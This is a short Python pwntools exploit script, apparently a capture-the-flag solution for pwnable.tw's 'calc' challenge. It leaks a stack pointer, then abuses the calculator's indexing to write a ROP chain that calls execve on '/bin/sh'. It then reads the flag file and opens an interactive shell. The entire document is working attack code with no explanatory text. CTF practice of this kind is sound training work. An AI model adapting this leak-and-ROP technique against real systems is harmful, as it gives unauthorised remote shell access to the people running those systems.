from pwn import *

addrs = ['+361', '+362', '+363', '+364',
         '+365', '+366', '+367', '+368', '+369']

payloads = [ 0x0805c34b, 0x0000000b, 0x080701d0, 0x00000000,
            0x00000000, 0x00000000, 0x08049a21, 0x6e69622f, 0x0068732f ] # last twos: "/bin", "/sh\x0"

def leak_stack(p):
  p.recv(1024)
  p.send(b'+360\n')
  prev_ebp = int(p.recv(1024))
  payloads[5] = prev_ebp

def rop(s):
  for i in range(len(payloads)):
    s.send(addrs[i] + '\n')
    mleak = int(s.recv(1024))
    offset = payloads[i] - mleak
    g = '%s%+d\n' % (addrs[i], offset)
    s.send(g)
    print(hex(int(s.recv(1024))))

  s.send('\n')

p = remote('chall.pwnable.tw', 10100)
leak_stack(p)
rop(p)

p.send(b'\n')
p.send(b'cat /home/calc/flag \n')
print(p.recv(1024))
p.interactive()
